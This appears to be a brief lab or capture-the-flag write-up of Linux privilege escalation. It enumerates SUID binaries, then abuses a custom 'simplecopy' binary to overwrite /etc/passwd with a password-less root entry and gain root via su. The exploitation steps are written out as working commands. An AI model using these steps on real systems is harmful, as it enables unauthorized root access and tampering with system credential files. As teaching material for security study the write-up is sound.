Find SUID bin using `find / 2>/dev/null -perm -u=s`
```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

`simplecopy` bin looks interesting. When we run it we see `Usage: simplecopy <source> <destination>`

Ok looks like we can abuse this to copy anything to anywhere.

let try remove root password in `/etc/passwd` file

```
echo root::0:0:root:/root:/bin/bash > ~/passwd
simplecopy ~/passwd /etc/passwd
su root
```

Success, now we are root


**REF**

[Linux-Privilege-Escalation-Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)
